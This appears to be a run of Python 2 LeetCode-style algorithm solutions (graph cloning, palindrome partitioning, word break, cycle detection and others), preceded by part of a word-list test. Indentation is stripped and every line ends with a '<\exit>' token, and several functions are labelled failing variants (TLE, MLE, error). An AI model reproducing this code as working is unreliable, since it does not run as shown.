"hour", "papa", "stag", "bern", "wove", "lull", "slip", "laze", "roil", "alto", "bath", "buck", "alma", "anus",<\exit>
"evil", "dumb", "oreo", "rare", "near", "cure", "isis", "hill", "kyle", "pace", "comb", "nits", "flip", "clop",<\exit>
"mort", "thea", "wall", "kiel", "judd", "coop", "dave", "very", "amie", "blah", "flub", "talc", "bold", "fogy",<\exit>
"idea", "prof", "horn", "shoo", "aped", "pins", "helm", "wees", "beer", "womb", "clue", "alba", "aloe", "fine",<\exit>
"bard", "limo", "shaw", "pint", "swim", "dust", "indy", "hale", "cats", "troy", "wens", "luke", "vern", "deli",<\exit>
"both", "brig", "daub", "sara", "sued", "bier", "noel", "olga", "dupe", "look", "pisa", "knox", "murk", "dame",<\exit>
"matt", "gold", "jame", "toge", "luck", "peck", "tass", "calf", "pill", "wore", "wadi", "thur", "parr", "maul",<\exit>
"tzar", "ones", "lees", "dark", "fake", "bast", "zoom", "here", "moro", "wine", "bums", "cows", "jean", "palm",<\exit>
"fume", "plop", "help", "tuba", "leap", "cans", "back", "avid", "lice", "lust", "polo", "dory", "stew", "kate",<\exit>
"rama", "coke", "bled", "mugs", "ajax", "arts", "drug", "pena", "cody", "hole", "sean", "deck", "guts", "kong",<\exit>
"bate", "pitt", "como", "lyle", "siam", "rook", "baby", "jigs", "bret", "bark", "lori", "reba", "sups", "made",<\exit>
"buzz", "gnaw", "alps", "clay", "post", "viol", "dina", "card", "lana", "doff", "yups", "tons", "live", "kids",<\exit>
"pair", "yawl", "name", "oven", "sirs", "gyms", "prig", "down", "leos", "noon", "nibs", "cook", "safe", "cobb",<\exit>
"raja", "awes", "sari", "nerd", "fold", "lots", "pete", "deal", "bias", "zeal", "girl", "rage", "cool", "gout",<\exit>
"whey", "soak", "thaw", "bear", "wing", "nagy", "well", "oink", "sven", "kurt", "etna", "held", "wood", "high",<\exit>
"feta", "twee", "ford", "cave", "knot", "tory", "ibis", "yaks", "vets", "foxy", "sank", "cone", "pius", "tall",<\exit>
"seem", "wool", "flap", "gird", "lore", "coot", "mewl", "sere", "real", "puts", "sell", "nuts", "foil", "lilt",<\exit>
"saga", "heft", "dyed", "goat", "spew", "daze", "frye", "adds", "glen", "tojo", "pixy", "gobi", "stop", "tile",<\exit>
"hiss", "shed", "hahn", "baku", "ahas", "sill", "swap", "also", "carr", "manx", "lime", "debs", "moat", "eked",<\exit>
"bola", "pods", "coon", "lacy", "tube", "minx", "buff", "pres", "clew", "gaff", "flee", "burn", "whom", "cola",<\exit>
"fret", "purl", "wick", "wigs", "donn", "guys", "toni", "oxen", "wite", "vial", "spam", "huts", "vats", "lima",<\exit>
"core", "eula", "thad", "peon", "erie", "oats", "boyd", "cued", "olaf", "tams", "secs", "urey", "wile", "penn",<\exit>
"bred", "rill", "vary", "sues", "mail", "feds", "aves", "code", "beam", "reed", "neil", "hark", "pols", "gris",<\exit>
"gods", "mesa", "test", "coup", "heed", "dora", "hied", "tune", "doze", "pews", "oaks", "bloc", "tips", "maid",<\exit>
"goof", "four", "woof", "silo", "bray", "zest", "kiss", "yong", "file", "hilt", "iris", "tuns", "lily", "ears",<\exit>
"pant", "jury", "taft", "data", "gild", "pick", "kook", "colt", "bohr", "anal", "asps", "babe", "bach", "mash",<\exit>
"biko", "bowl", "huey", "jilt", "goes", "guff", "bend", "nike", "tami", "gosh", "tike", "gees", "urge", "path",<\exit>
"bony", "jude", "lynn", "lois", "teas", "dunn", "elul", "bonn", "moms", "bugs", "slay", "yeah", "loan", "hulk",<\exit>
"lows", "damn", "nell", "jung", "avis", "mane", "waco", "loin", "knob", "tyke", "anna", "hire", "luau", "tidy",<\exit>
"nuns", "pots", "quid", "exec", "hans", "hera", "hush", "shag", "scot", "moan", "wald", "ursa", "lorn", "hunk",<\exit>
"loft", "yore", "alum", "mows", "slog", "emma", "spud", "rice", "worn", "erma", "need", "bags", "lark", "kirk",<\exit>
"pooh", "dyes", "area", "dime", "luvs", "foch", "refs", "cast", "alit", "tugs", "even", "role", "toed", "caph",<\exit>
"nigh", "sony", "bide", "robs", "folk", "daft", "past", "blue", "flaw", "sana", "fits", "barr", "riot", "dots",<\exit>
"lamp", "cock", "fibs", "harp", "tent", "hate", "mali", "togs", "gear", "tues", "bass", "pros", "numb", "emus",<\exit>
"hare", "fate", "wife", "mean", "pink", "dune", "ares", "dine", "oily", "tony", "czar", "spay", "push", "glum",<\exit>
"till", "moth", "glue", "dive", "scad", "pops", "woks", "andy", "leah", "cusp", "hair", "alex", "vibe", "bulb",<\exit>
"boll", "firm", "joys", "tara", "cole", "levy", "owen", "chow", "rump", "jail", "lapp", "beet", "slap", "kith",<\exit>
"more", "maps", "bond", "hick", "opus", "rust", "wist", "shat", "phil", "snow", "lott", "lora", "cary", "mote",<\exit>
"rift", "oust", "klee", "goad", "pith", "heep", "lupe", "ivan", "mimi", "bald", "fuse", "cuts", "lens", "leer",<\exit>
"eyry", "know", "razz", "tare", "pals", "geek", "greg", "teen", "clef", "wags", "weal", "each", "haft", "nova",<\exit>
"waif", "rate", "katy", "yale", "dale", "leas", "axum", "quiz", "pawn", "fend", "capt", "laws", "city", "chad",<\exit>
"coal", "nail", "zaps", "sort", "loci", "less", "spur", "note", "foes", "fags", "gulp", "snap", "bogs", "wrap",<\exit>
"dane", "melt", "ease", "felt", "shea", "calm", "star", "swam", "aery", "year", "plan", "odin", "curd", "mira",<\exit>
"mops", "shit", "davy", "apes", "inky", "hues", "lome", "bits", "vila", "show", "best", "mice", "gins", "next",<\exit>
"roan", "ymir", "mars", "oman", "wild", "heal", "plus", "erin", "rave", "robe", "fast", "hutu", "aver", "jodi",<\exit>
"alms", "yams", "zero", "revs", "wean", "chic", "self", "jeep", "jobs", "waxy", "duel", "seek", "spot", "raps",<\exit>
"pimp", "adan", "slam", "tool", "morn", "futz", "ewes", "errs", "knit", "rung", "kans", "muff", "huhs", "tows",<\exit>
"lest", "meal", "azov", "gnus", "agar", "sips", "sway", "otis", "tone", "tate", "epic", "trio", "tics", "fade",<\exit>
"lear", "owns", "robt", "weds", "five", "lyon", "terr", "arno", "mama", "grey", "disk", "sept", "sire", "bart",<\exit>
"saps", "whoa", "turk", "stow", "pyle", "joni", "zinc", "negs", "task", "leif", "ribs", "malt", "nine", "bunt",<\exit>
"grin", "dona", "nope", "hams", "some", "molt", "smit", "sacs", "joan", "slav", "lady", "base", "heck", "list",<\exit>
"take", "herd", "will", "nubs", "burg", "hugs", "peru", "coif", "zoos", "nick", "idol", "levi", "grub", "roth",<\exit>
"adam", "elma", "tags", "tote", "yaws", "cali", "mete", "lula", "cubs", "prim", "luna", "jolt", "span", "pita",<\exit>
"dodo", "puss", "deer", "term", "dolt", "goon", "gary", "yarn", "aims", "just", "rena", "tine", "cyst", "meld",<\exit>
"loki", "wong", "were", "hung", "maze", "arid", "cars", "wolf", "marx", "faye", "eave", "raga", "flow", "neal",<\exit>
"lone", "anne", "cage", "tied", "tilt", "soto", "opel", "date", "buns", "dorm", "kane", "akin", "ewer", "drab",<\exit>
"thai", "jeer", "grad", "berm", "rods", "saki", "grus", "vast", "late", "lint", "mule", "risk", "labs", "snit",<\exit>
"gala", "find", "spin", "ired", "slot", "oafs", "lies", "mews", "wino", "milk", "bout", "onus", "tram", "jaws",<\exit>
"peas", "cleo", "seat", "gums", "cold", "vang", "dewy", "hood", "rush", "mack", "yuan", "odes", "boos", "jami",<\exit>
"mare", "plot", "swab", "borg", "hays", "form", "mesh", "mani", "fife", "good", "gram", "lion", "myna", "moor",<\exit>
"skin", "posh", "burr", "rime", "done", "ruts", "pays", "stem", "ting", "arty", "slag", "iron", "ayes", "stub",<\exit>
"oral", "gets", "chid", "yens", "snub", "ages", "wide", "bail", "verb", "lamb", "bomb", "army", "yoke", "gels",<\exit>
"tits", "bork", "mils", "nary", "barn", "hype", "odom", "avon", "hewn", "rios", "cams", "tact", "boss", "oleo",<\exit>
"duke", "eris", "gwen", "elms", "deon", "sims", "quit", "nest", "font", "dues", "yeas", "zeta", "bevy", "gent",<\exit>
"torn", "cups", "worm", "baum", "axon", "purr", "vise", "grew", "govs", "meat", "chef", "rest", "lame"])<\exit>
) == 11<\exit>
class Solution:<\exit>
def longestConsecutive_TLE(self, num):<\exit>
length = len(num)<\exit>
inverted_table = dict(zip(num, range(length)))<\exit>
max_length = -1<<31<\exit>
for ind, val in enumerate(num):<\exit>
current_length = 1<\exit>
sequence_val_expected = val-1<\exit>
while sequence_val_expected in inverted_table:<\exit>
sequence_val_expected -= 1<\exit>
current_length += 1<\exit>
sequence_val_expected = val+1<\exit>
while sequence_val_expected in inverted_table:<\exit>
sequence_val_expected += 1<\exit>
current_length += 1<\exit>
max_length = max(max_length, current_length)<\exit>
return max_length<\exit>
def longestConsecutive(self, num):<\exit>
visited = {item: False for item in num}<\exit>
max_length = -1<<31<\exit>
for ind, val in enumerate(num):<\exit>
if visited[val]: continue<\exit>
current_length = 1<\exit>
sequence_val_expected = val-1<\exit>
while sequence_val_expected in visited:<\exit>
visited[sequence_val_expected] = True<\exit>
sequence_val_expected -= 1<\exit>
current_length += 1<\exit>
sequence_val_expected = val+1<\exit>
while sequence_val_expected in visited:<\exit>
visited[sequence_val_expected] = True<\exit>
sequence_val_expected += 1<\exit>
current_length += 1<\exit>
max_length = max(max_length, current_length)<\exit>
return max_length<\exit>
class TreeNode:<\exit>
def __init__(self, x):<\exit>
self.val = x<\exit>
self.left = None<\exit>
self.right = None<\exit>
class Solution:<\exit>
def sumNumbers(self, root):<\exit>
result = []<\exit>
self.dfs(root, "", result)<\exit>
result = [int(element) for element in result]<\exit>
return sum(result)<\exit>
def dfs(self, root, cur, result):<\exit>
if not root:<\exit>
return<\exit>
cur = cur+str(root.val)<\exit>
if not root.left and not root.right:<\exit>
result.append(cur)<\exit>
return<\exit>
if root.left:<\exit>
self.dfs(root.left, cur, result)<\exit>
if root.right:<\exit>
self.dfs(root.right, cur, result)<\exit>
def dfs_error(self, root, cur, result):<\exit>
if not root:<\exit>
return<\exit>
cur.append(root.val)<\exit>
if not root.left and not root.right:<\exit>
result.append(cur)<\exit>
return<\exit>
if root.left:<\exit>
self.dfs_error(root.left, cur, result)<\exit>
if root.right:<\exit>
self.dfs_error(root.right, cur, result)<\exit>
if __name__=="__main__":<\exit>
nodes = [TreeNode(0), TreeNode(1), TreeNode(3)]<\exit>
nodes[0].left = nodes[1]<\exit>
nodes[0].right = nodes[2]<\exit>
Solution().sumNumbers(nodes[0])<\exit>
CONNECTED = 'C'<\exit>
directions = [(1, 0), (-1, 0), (0, 1), (0, -1)]<\exit>
class Solution:<\exit>
def solve(self, board):<\exit>
if not board or not board[0]:<\exit>
return<\exit>
q = []<\exit>
m = len(board)<\exit>
n = len(board[0])<\exit>
for i in xrange(m):<\exit>
if board[i][0]=='O': q.append((i, 0))<\exit>
if board[i][n-1]=='O': q.append((i, n-1))<\exit>
for j in xrange(1, n-1):<\exit>
if board[0][j]=='O': q.append((0, j))<\exit>
if board[m-1][j]=='O': q.append((m-1, j))<\exit>
while q:<\exit>
cor = q.pop()<\exit>
board[cor[0]][cor[1]]=CONNECTED<\exit>
for direction in directions:<\exit>
row = cor[0]+direction[0]<\exit>
col = cor[1]+direction[1]<\exit>
if 0<=row<m and 0<=col<n and board[row][col]=='O':<\exit>
q.append((row, col))<\exit>
for i in xrange(m):<\exit>
for j in xrange(n):<\exit>
if board[i][j]=='O':<\exit>
board[i][j] = 'X'<\exit>
elif board[i][j]==CONNECTED:<\exit>
board[i][j] = 'O'<\exit>
if __name__=="__main__":<\exit>
board = [<\exit>
['X', 'X', 'X', 'X'],<\exit>
['X', 'O', 'O', 'X'],<\exit>
['X', 'X', 'O', 'X'],<\exit>
['X', 'O', 'X', 'X']<\exit>
]<\exit>
expected_board = [<\exit>
['X', 'X', 'X', 'X'],<\exit>
['X', 'X', 'X', 'X'],<\exit>
['X', 'X', 'X', 'X'],<\exit>
['X', 'O', 'X', 'X']<\exit>
]<\exit>
Solution().solve(board)<\exit>
assert board==expected_board<\exit>
class Solution:<\exit>
def partition(self, s):<\exit>
result = []<\exit>
self.get_partition(s, [], result)<\exit>
return result<\exit>
def get_partition(self, seq, cur, result):<\exit>
if not seq:<\exit>
result.append(cur)<\exit>
for i in xrange(len(seq)):<\exit>
if self.is_palindrome(seq[:i+1]):<\exit>
self.get_partition(seq[i+1:], cur+[seq[:i+1]], result)<\exit>
def is_palindrome(self, s):<\exit>
return s == s[::-1]<\exit>
if __name__=="__main__":<\exit>
assert Solution().partition("aab")==[['a', 'a', 'b'], ['aa', 'b']]<\exit>
class Solution(object):<\exit>
def minCut(self, s):<\exit>
n = len(s)<\exit>
P = [[False for _ in xrange(n+1)] for _ in xrange(n+1)]<\exit>
for i in xrange(n+1):<\exit>
P[i][i] = True<\exit>
for i in xrange(n):<\exit>
P[i][i+1] = True<\exit>
for i in xrange(n, -1, -1):<\exit>
for j in xrange(i+2, n+1):<\exit>
P[i][j] = P[i+1][j-1] and s[i] == s[j-1]<\exit>
C = [i for i in xrange(n+1)]<\exit>
for i in xrange(n+1):<\exit>
if P[0][i]:<\exit>
C[i] = 0<\exit>
else:<\exit>
C[i] = min(<\exit>
C[j] + 1<\exit>
for j in xrange(i)<\exit>
if P[j][i]<\exit>
)<\exit>
return C[n]<\exit>
def minCut_dp(self, s):<\exit>
if not s:<\exit>
return 0<\exit>
length = len(s)<\exit>
P = [[False for _ in xrange(length+1)] for _ in xrange(length+1)]<\exit>
for i in xrange(length+1):<\exit>
try:<\exit>
P[i][i] = True<\exit>
P[i][i+1] = True<\exit>
except IndexError:<\exit>
pass<\exit>
for i in xrange(length, -1, -1):<\exit>
for j in xrange(i+2, length+1):<\exit>
try:<\exit>
P[i][j] = P[i+1][j-1] and s[i] == s[j-1]<\exit>
except IndexError:<\exit>
P[i][j] = True<\exit>
D = [length-i-1 for i in xrange(length)]<\exit>
for i in xrange(length-1, -1, -1):<\exit>
if P[i][length]:<\exit>
D[i] = 0<\exit>
else:<\exit>
for j in xrange(i+1, length):<\exit>
if P[i][j]:<\exit>
D[i] = min(D[i], D[j]+1)<\exit>
return D[0]<\exit>
def minCut_MLE(self, s):<\exit>
q = [[s]]<\exit>
count = -1<\exit>
while q:<\exit>
length = len(q)<\exit>
count += 1<\exit>
for cur_level in xrange(length):<\exit>
cur = q[cur_level]<\exit>
if all(self.is_palindrome(item) for item in cur):<\exit>
return count<\exit>
for ind, val in enumerate(cur):<\exit>
for i in xrange(1, len(val)):<\exit>
cut1 = val[:i]<\exit>
cut2 = val[i:]<\exit>
new_cur = list(cur)<\exit>
new_cur[ind] = cut1<\exit>
new_cur.insert(ind+1, cut2)<\exit>
q.append(new_cur)<\exit>
q = q[length:]<\exit>
def minCut_TLE(self, s):<\exit>
if not s:<\exit>
return 0<\exit>
length = len(s)<\exit>
dp = [[1<<32-1 for _ in xrange(length+1)] for _ in xrange(length+1)]<\exit>
for i in xrange(length+1):<\exit>
try:<\exit>
dp[i][i] = 0<\exit>
dp[i][i+1] = 0<\exit>
except IndexError:<\exit>
pass<\exit>
for i in xrange(length, -1, -1):<\exit>
for k in xrange(i, length+1):<\exit>
if self.is_palindrome(s[i:k]):<\exit>
dp[i][k] = 0<\exit>
else:<\exit>
dp[i][k] = min(1+dp[i][j]+dp[j][k] for j in xrange(i+1, k))<\exit>
return dp[0][length]<\exit>
def is_palindrome(self, s):<\exit>
return s == s[::-1]<\exit>
def minCut_TLE2(self, s):<\exit>
if not s:<\exit>
return 0<\exit>
length = len(s)<\exit>
dp2 = [[False for _ in xrange(length+1)] for _ in xrange(length+1)]<\exit>
for i in xrange(length+1):<\exit>
try:<\exit>
dp2[i][i] = True<\exit>
dp2[i][i+1] = True<\exit>
except IndexError:<\exit>
pass<\exit>
for i in xrange(length, -1, -1):<\exit>
for j in xrange(i+2, length+1):<\exit>
try:<\exit>
dp2[i][j] = dp2[i+1][j-1] and s[i] == s[j-1]<\exit>
except IndexError:<\exit>
dp2[i][j] = True<\exit>
dp = [[1<<32-1 for _ in xrange(length+1)] for _ in xrange(length+1)]<\exit>
for i in xrange(length+1):<\exit>
try:<\exit>
dp[i][i] = 0<\exit>
dp[i][i+1] = 0<\exit>
except IndexError:<\exit>
pass<\exit>
for i in xrange(length, -1, -1):<\exit>
for k in xrange(i, length+1):<\exit>
if dp2[i][k]:<\exit>
dp[i][k] = 0<\exit>
else:<\exit>
dp[i][k] = min(1+dp[i][j]+dp[j][k] for j in xrange(i+1, k))<\exit>
return dp[0][length]<\exit>
if __name__ == "__main__":<\exit>
assert Solution().minCut("aabbc") == 2<\exit>
assert Solution().minCut(<\exit>
"apjesgpsxoeiokmqmfgvjslcjukbqxpsobyhjpbgdfruqdkeiszrlmtwgfxyfostpqczidfljwfbbrflkgdvtytbgqalguewnhvvmcgxboycffopmtmhtfizxkmeftcucxpobxmelmjtuzigsxnncxpaibgpuijwhankxbplpyejxmrrjgeoevqozwdtgospohznkoyzocjlracchjqnggbfeebmuvbicbvmpuleywrpzwsihivnrwtxcukwplgtobhgxukwrdlszfaiqxwjvrgxnsveedxseeyeykarqnjrtlaliyudpacctzizcftjlunlgnfwcqqxcqikocqffsjyurzwysfjmswvhbrmshjuzsgpwyubtfbnwajuvrfhlccvfwhxfqthkcwhatktymgxostjlztwdxritygbrbibdgkezvzajizxasjnrcjwzdfvdnwwqeyumkamhzoqhnqjfzwzbixclcxqrtniznemxeahfozp") == 452<\exit>
class UndirectedGraphNode:<\exit>
def __init__(self, x):<\exit>
self.label = x<\exit>
self.neighbors = []<\exit>
def __repr__(self):<\exit>
return repr(self.label)<\exit>
class Solution:<\exit>
def cloneGraph_TLE(self, node):<\exit>
return self.clone_graph_visited(node, set())<\exit>
def clone_graph_visited(self, node, visited_set):<\exit>
if not node:<\exit>
return<\exit>
visited_set.add(node)<\exit>
neighbors_cloned = [self.clone_graph_visited(neighbor, set(visited_set)) for neighbor in node.neighbors if neighbor not in visited_set]<\exit>
node_cloned = UndirectedGraphNode(node.label)<\exit>
for neighbor_cloned in neighbors_cloned:<\exit>
if neighbor_cloned not in visited_set:<\exit>
neighbor_cloned.neighbors.append(node_cloned)<\exit>
node_cloned.neighbors = neighbors_cloned<\exit>
return node_cloned<\exit>
def cloneGraph(self, node):<\exit>
if not node:<\exit>
return<\exit>
original2copy = {}<\exit>
q = [node]<\exit>
clone = UndirectedGraphNode(node.label)<\exit>
original2copy[node] = clone<\exit>
while q:<\exit>
cur = q.pop()<\exit>
for neighbor in cur.neighbors:<\exit>
if neighbor in original2copy:<\exit>
original2copy[cur].neighbors.append(original2copy[neighbor])<\exit>
else:<\exit>
q.append(neighbor)<\exit>
clone_neighbor = UndirectedGraphNode(neighbor.label)<\exit>
original2copy[neighbor] = clone_neighbor<\exit>
original2copy[cur].neighbors.append(original2copy[neighbor])<\exit>
return original2copy[node]<\exit>
if __name__=="__main__":<\exit>
lst = [UndirectedGraphNode(i+1) for i in range(3)]<\exit>
for item in lst:<\exit>
item.neighbors = list(lst)<\exit>
item.neighbors.remove(item)<\exit>
cloned = Solution().cloneGraph(lst[0])<\exit>
assert cloned.neighbors[0].label in (2, 3)<\exit>
assert cloned.neighbors[1].label in (2, 3)<\exit>
class Solution:<\exit>
def canCompleteCircuit(self, gas, cost):<\exit>
length = len(gas)<\exit>
diff = [gas[i]-cost[i] for i in xrange(length)]<\exit>
if sum(diff)<0:<\exit>
return -1<\exit>
start_index = 0<\exit>
sum_before = 0<\exit>
for ind, val in enumerate(diff):<\exit>
sum_before += val<\exit>
if sum_before<0:<\exit>
start_index = ind+1<\exit>
sum_before = 0<\exit>
return start_index<\exit>
if __name__=="__main__":<\exit>
Solution().canCompleteCircuit([5], [4])<\exit>
class Solution:<\exit>
def candy(self, ratings):<\exit>
length = len(ratings)<\exit>
dp = [-1 for _ in xrange(length)]<\exit>
dp[0] = 1<\exit>
for ind in xrange(1, length):<\exit>
val = ratings[ind]<\exit>
if ratings[ind-1]<val:<\exit>
dp[ind] = dp[ind-1]+1<\exit>
elif ratings[ind-1]>val:<\exit>
dp[ind] = dp[ind-1]-1<\exit>
else:<\exit>
dp[ind] = 1<\exit>
if ind+1<length and ratings[ind-1]>val and val<=ratings[ind+1]:<\exit>
self.re_adjust(ratings, dp, ind)<\exit>
if ratings[length-2]>ratings[length-1]:<\exit>
self.re_adjust(ratings, dp, length-1)<\exit>
return sum(dp)<\exit>
def re_adjust(self, ratings, dp, ind):<\exit>
original = dp[ind]<\exit>
if original==1: return<\exit>
i = ind<\exit>
candy = 1<\exit>
while i>0 and ratings[i-1]>ratings[i]:<\exit>
dp[i] = candy<\exit>
candy += 1<\exit>
i -= 1<\exit>
if original<1:<\exit>
dp[i] = candy<\exit>
if __name__=="__main__":<\exit>
assert Solution().candy([58,21,72,77,48,9,38,71,68,77,82,47,25,94,89,54,26,54,54,99,64,71,76,63,81,82,60,64,29,51,87,87,72,12,16,20,21,54,43,41,83,77,41,61,72,82,15,50,36,69,49,53,92,77,16,73,12,28,37,41,79,25,80,3,37,48,23,10,55,19,51,38,96,92,99,68,75,14,18,63,35,19,68,28,49,36,53,61,64,91,2,43,68,34,46,57,82,22,67,89])==208<\exit>
assert Solution().candy([4, 2, 3, 4, 1])==9<\exit>
assert Solution().candy([1, 4, 3, 2, 1])==11<\exit>
assert Solution().candy([8, 7, 6, 5, 4, 3, 2, 1])==36<\exit>
class Solution:<\exit>
def singleNumber(self, A):<\exit>
storage = 0<\exit>
for element in A:<\exit>
storage ^= element<\exit>
return storage<\exit>
class Solution:<\exit>
def singleNumber_optimal(self, A):<\exit>
bit_0, bit_1, bit_2 = ~0, 0, 0<\exit>
for elmt in A:<\exit>
bit_t = bit_2<\exit>
bit_2 = (bit_1 & elmt) | (bit_2 & ~elmt)<\exit>
bit_1 = (bit_0 & elmt) | (bit_1 & ~elmt)<\exit>
bit_0 = (bit_t & elmt) | (bit_0 & ~elmt)<\exit>
return bit_1<\exit>
def singleNumber_array(self, A):<\exit>
cnt = [0 for _ in xrange(32)]<\exit>
for elmt in A:<\exit>
for i in xrange(32):<\exit>
if elmt>>i&1==1:<\exit>
cnt[i] = (cnt[i]+1)%3<\exit>
result = 0<\exit>
for i in xrange(32):<\exit>
result |= cnt[i]<<i<\exit>
return result<\exit>
def singleNumber(self, A):<\exit>
one, two, three = 0, 0, 0<\exit>
for elmt in A:<\exit>
two |= one&elmt<\exit>
one ^= elmt<\exit>
three = one&two<\exit>
one &= ~three<\exit>
two &= ~three<\exit>
return one<\exit>
if __name__=="__main__":<\exit>
tests = [<\exit>
[1, 1, 1, 2, 2, 2, 3, 4, 4, 4],<\exit>
[1]<\exit>
]<\exit>
for A in tests:<\exit>
assert Solution().singleNumber_optimal(A)==Solution().singleNumber_array(A)<\exit>
assert Solution().singleNumber_optimal(A)==Solution().singleNumber(A)<\exit>
class RandomListNode:<\exit>
def __init__(self, x):<\exit>
self.label = x<\exit>
self.next = None<\exit>
self.random = None<\exit>
class Solution:<\exit>
def copyRandomList(self, head):<\exit>
dummy = RandomListNode(0)<\exit>
dummy.next = head<\exit>
pre = dummy<\exit>
while pre.next:<\exit>
cur = pre.next<\exit>
cur_copy = RandomListNode(cur.label)<\exit>
temp = cur.next<\exit>
cur.next = cur_copy<\exit>
cur_copy.next = temp<\exit>
pre = pre.next.next<\exit>
pre = dummy<\exit>
while pre.next:<\exit>
cur = pre.next<\exit>
if cur.random:<\exit>
cur.next.random = cur.random.next<\exit>
pre = pre.next.next<\exit>
pre = dummy<\exit>
head_copy = pre.next.next if pre.next else None<\exit>
while pre.next:<\exit>
cur = pre.next<\exit>
cur_copy = cur.next<\exit>
cur.next = cur_copy.next<\exit>
if cur_copy.next:<\exit>
cur_copy.next = cur_copy.next.next<\exit>
pre = pre.next<\exit>
return head_copy<\exit>
class Solution:<\exit>
def wordBreak_TLE(self, s, dict):<\exit>
string_builder = ""<\exit>
if s=="":<\exit>
return True<\exit>
for i in range(len(s)):<\exit>
string_builder += s[i]<\exit>
if string_builder in dict:<\exit>
try:<\exit>
if self.wordBreak_TLE(s[i+1:], dict):<\exit>
return True<\exit>
else:<\exit>
continue<\exit>
except IndexError:<\exit>
return True<\exit>
return False<\exit>
def wordBreak(self, s, dict):<\exit>
dp = [False] * (len(s)+1)<\exit>
dp[0] = True<\exit>
for i in range(len(dp)):<\exit>
if dp[i]:<\exit>
for word in dict:<\exit>
try:<\exit>
if dp[i+len(word)]==True:<\exit>
continue<\exit>
if s[i:i+len(word)]==word:<\exit>
dp[i+len(word)] = True<\exit>
except IndexError:<\exit>
continue<\exit>
return dp[-1]<\exit>
if __name__=="__main__":<\exit>
assert Solution().wordBreak("aaaaaaa", ["aaaa", "aaa"])==True<\exit>
from collections import deque<\exit>
class Solution:<\exit>
def wordBreak(self, s, dict):<\exit>
dp = [[] for _ in range(len(s) + 1)]<\exit>
dp[0].append("dummy")<\exit>
for i in range(len(s)):<\exit>
if not dp[i]:<\exit>
continue<\exit>
for word in dict:<\exit>
if s[i:i + len(word)] == word:<\exit>
dp[i + len(word)].append(word)<\exit>
if not dp[-1]:<\exit>
return []<\exit>
result = []<\exit>
self.build_result(dp, len(s), deque(), result)<\exit>
return result<\exit>
def build_result(self, dp, cur_index, cur_sentence, result):<\exit>
if cur_index == 0:<\exit>
result.append(" ".join(cur_sentence))<\exit>
return<\exit>
for prefix in dp[cur_index]:<\exit>
cur_sentence.appendleft(prefix)<\exit>
self.build_result(dp, cur_index - len(prefix), cur_sentence, result)<\exit>
cur_sentence.popleft()<\exit>
if __name__=="__main__":<\exit>
assert Solution().wordBreak("catsanddog", ["cat", "cats", "and", "sand", "dog"])==['cat sand dog', 'cats and dog']<\exit>
class ListNode:<\exit>
def __init__(self, x):<\exit>
self.val = x<\exit>
self.next = None<\exit>
class Solution:<\exit>
def hasCycle(self, head):<\exit>
hare = head<\exit>
tortoise = head<\exit>
while hare and hare.next and tortoise:<\exit>
hare = hare.next.next<\exit>
tortoise = tortoise.next<\exit>
if hare==tortoise:<\exit>
return True<\exit>
return False<\exit>
class ListNode:<\exit>
def __init__(self, x):<\exit>
self.val = x<\exit>
self.next = None<\exit>
class Solution:<\exit>
def detectCycle(self, head):<\exit>
hare = head<\exit>
tortoise = head<\exit>
flag = False<\exit>
while hare and hare.next and tortoise:<\exit>
hare = hare.next.next<\exit>
tortoise = tortoise.next<\exit>
if hare==tortoise:<\exit>
flag = True<\exit>
break<\exit>
if not flag:<\exit>
return None<\exit>
cur = head<\exit>
while cur:<\exit>
if cur==tortoise:<\exit>
break<\exit>
cur = cur.next<\exit>
tortoise = tortoise.next<\exit>
return cur<\exit>
class ListNode:<\exit>
def __init__(self, x):<\exit>
self.val = x<\exit>
self.next = None<\exit>
def __repr__(self):<\exit>
return repr(self.val)<\exit>
class Solution:<\exit>
def reorderList_TLE(self, head):<\exit>
dummy_head = ListNode(0)<\exit>
dummy_head.next = head<\exit>
pre_cur = dummy_head<\exit>
while(pre_cur and pre_cur.next):<\exit>
pre_last = pre_cur.next<\exit>
if pre_last.next == None:<\exit>
return<\exit>
while(pre_last.next.next):<\exit>
pre_last = pre_last.next<\exit>
last = pre_last.next<\exit>
cur = pre_cur.next<\exit>
cur_next = cur.next<\exit>
if cur_next!= last and cur!= last:<\exit>
cur.next = last<\exit>
last.next = cur_next<\exit>
pre_last.next = None<\exit>
if cur_next and cur_next.next==last:<\exit>
cur_next.next = None<\exit>
pre_cur = pre_cur.next.next<\exit>
def reorderList_array(self, head):<\exit>
lst = []<\exit>
cur = head<\exit>
while(cur):<\exit>
lst.append(cur)<\exit>
cur = cur.next<\exit>
lst1 = lst[:len(lst)/2]<\exit>
lst2 = lst[len(lst)/2:]<\exit>
lst2.reverse()<\exit>
lst = []<\exit>
for i in range(len(lst2)):<\exit>
try:<\exit>
lst.append(lst1[i])<\exit>
except IndexError:<\exit>
pass<\exit>
lst.append(lst2[i])<\exit>
for i in range(len(lst)):<\exit>
try:<\exit>
lst[i].next = lst[i+1]<\exit>
except IndexError:<\exit>
lst[i].next = None<\exit>
def reorderList(self, head):<\exit>
if not head:<\exit>
return<\exit>
dummy = ListNode(0)<\exit>
dummy.next = head<\exit>
slow_pre = dummy<\exit>
fast_pre = dummy<\exit>
while fast_pre.next and fast_pre.next.next:<\exit>
fast_pre = fast_pre.next<\exit>
fast_pre = fast_pre.next<\exit>
slow_pre = slow_pre.next<\exit>
mid = slow_pre.next<\exit>
pre = mid<\exit>
cur = pre.next<\exit>
while pre and cur:<\exit>
cur.next, pre, cur = pre, cur, cur.next<\exit>
mid.next = None<\exit>
last = pre<\exit>
cur = dummy.next<\exit>
while cur!=mid and last!=mid:<\exit>
cur.next, last.next, last, cur = last, cur.next, last.next, cur.next<\exit>
if __name__=="__main__":<\exit>
length = 2<\exit>
lst = [ListNode(i+1) for i in range(length)]<\exit>
for i in range(length-1):<\exit>
lst[i].next = lst[i+1]<\exit>
Solution().reorderList(lst[0])<\exit>
cur = lst[0]<\exit>
while(cur):<\exit>
print cur.val<\exit>
cur = cur.next<\exit>
class TreeNode(object):<\exit>
def __init__(self, x):<\exit>
self.val = x<\exit>
self.left = None<\exit>
self.right = None<\exit>
class Solution(object):<\exit>
def preorderTraversal(self, root):<\exit>
ret = []<\exit>
cur = root<\exit>
while cur:<\exit>
if not cur.left:<\exit>
ret.append(cur.val)<\exit>
cur = cur.right<\exit>
else:<\exit>
pre = cur.left<\exit>
while pre.right and pre.right != cur:<\exit>
pre = pre.right<\exit>
if not pre.right:<\exit>
pre.right = cur<\exit>
ret.append(cur.val)<\exit>
cur = cur.left<\exit>
else:<\exit>
pre.right = None<\exit>
cur = cur.right<\exit>
return ret<\exit>
def preorderTraversal_memory(self, root):<\exit>
lst = []<\exit>
